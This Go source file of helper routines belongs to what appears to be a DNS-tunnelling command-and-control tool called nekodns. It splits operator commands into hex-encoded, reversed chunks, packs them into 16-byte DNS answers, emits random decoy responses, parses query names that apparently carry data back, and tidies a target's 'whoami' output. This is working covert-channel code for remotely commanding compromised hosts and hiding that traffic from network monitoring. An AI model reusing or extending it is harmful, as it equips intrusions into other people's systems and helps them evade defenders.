package nekodns

import (
	"encoding/binary"
	"encoding/hex"
	"math/rand"
	"strings"
	"time"
)

// ReverseString reverses a string
func ReverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

// RandomResponse generates a random DNS response
func RandomResponse() []byte {
	rdata := make([]byte, 16)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < 16; i += 2 {
		val := rand.Intn(0xFFFF)
		binary.BigEndian.PutUint16(rdata[i:], uint16(val))
	}
	return rdata
}

// SplitCommand splits a command into chunks for DNS transmission
func SplitCommand(cmd string, maxBytes int) []string {
	var chunks []string
	cmdBytes := []byte(cmd)
	partSize := maxBytes - 5

	for i := 0; i < len(cmdBytes); i += partSize {
		end := i + partSize
		if end > len(cmdBytes) {
			end = len(cmdBytes)
		}

		part := cmdBytes[i:end]
		var chunkBytes []byte

		if end < len(cmdBytes) {
			chunkBytes = append(part, []byte("[->]")...)
		} else {
			chunkBytes = part
		}

		chunks = append(chunks, ReverseString(hex.EncodeToString(chunkBytes)))
	}

	return chunks
}

// PackChunk packs a hex chunk into DNS response format
func PackChunk(chunkHexString string) []byte {
	rawBytes, err := hex.DecodeString(chunkHexString)
	if err != nil {
		rawBytes = []byte{}
	}

	result := make([]byte, 16)
	length := len(rawBytes)

	if length > 15 {
		length = 15
		rawBytes = rawBytes[:15]
	}

	result[0] = byte(length)
	copy(result[1:], rawBytes)

	return result
}

// CleanWhoami cleans the whoami output
func CleanWhoami(raw string) string {
	if strings.Contains(raw, "\\") {
		parts := strings.Split(raw, "\\")
		if len(parts) > 1 {
			return strings.ToLower(parts[1])
		}
	}
	return strings.ToLower(raw)
}

// ExtractQuery extracts the domain name from DNS query
func ExtractQuery(data []byte) string {
	if len(data) < 13 {
		return ""
	}

	var qname []string
	i := 12

	for i < len(data) {
		length := int(data[i])
		if length == 0 {
			break
		}
		i++
		if i+length > len(data) {
			break
		}
		qname = append(qname, string(data[i:i+length]))
		i += length
	}

	return strings.Join(qname, ".")
}
